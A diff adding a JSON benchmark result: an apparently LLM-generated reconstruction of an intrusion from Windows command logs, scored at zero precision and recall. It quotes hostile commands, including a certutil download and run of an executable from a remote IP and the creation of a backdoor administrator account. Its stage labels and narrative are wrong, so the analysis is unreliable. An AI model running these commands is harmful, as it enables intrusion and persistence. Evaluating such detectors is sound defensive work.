@@ -1,0 +1,122 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg ADD \\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg ADD \\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \\\"cd /d D:/phpStudy/WWW\\&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]\\&cd\\&echo [E]\" 2>&1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "net user oop o33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net user nbb nb123.",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --crash-handler \"--database=c:\\users\\administrator\\appdata\\local\\Google\\Software Reporter Tool\" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=3 --init-done-notifier=812 --sandbox-mojo-pipe-token=2896627467350078373 --mojo-platform-channel-handle=804",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers initiated an attack by gaining discovery through Powershell commands, reaching lateral movement by accessing administrative rights, collecting sensitive information via NetSh and Reg commands, establishing persistence through Windows Firewall rules and registry entries, creating new administrator accounts, accessing those accounts for credential access, executing downloaded executables from remote servers, and finally communicating with command and control servers.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36539,
+      "completion_tokens": 6437,
+      "total_tokens": 42976,
+      "wall_clock_s": 79.534,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 18,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 18,
+      "fn": 6,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36539,
+      "completion_tokens": 6437,
+      "total_tokens": 42976,
+      "wall_clock_s": 79.534,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
